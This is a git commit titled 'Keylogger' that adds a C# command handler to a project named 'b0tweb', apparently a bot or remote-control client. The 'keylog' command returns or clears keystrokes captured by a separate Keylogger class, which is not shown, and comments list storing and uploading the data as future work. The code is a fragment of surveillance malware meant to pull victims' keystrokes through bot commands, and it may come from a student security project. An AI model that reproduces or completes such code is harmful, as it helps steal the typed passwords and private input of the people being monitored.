196bf698d482b305482035a58acb7aa0147ab0c5
JurisMajors <j.a.majors@student.tue.nl>
2020-02-21 17:16:52 +0100

    Keylogger

---
+++ b0tweb/Commands/KeyloggerCommand.cs
@@ -0,0 +1,28 @@
+﻿namespace b0tweb.Commands
+{
+    class KeyloggerCommand : AbstractCommand
+    {
+        public override string Command => "keylog";
+
+        protected override string ExecuteCommand(string[] args)
+        {
+            Keylogger keylogger = Keylogger.GetInstance;
+
+            if (args.Length == 0)
+            {
+                return keylogger.Data;
+            }
+            else if (args[0].Equals("clear"))
+            {
+                keylogger.Clear();
+
+                return "keylogger cleared";
+            }
+
+            // TODO: store functionality?
+            // TODO: upload functionality
+
+            return keylogger.Data;
+        }
+    }
+}
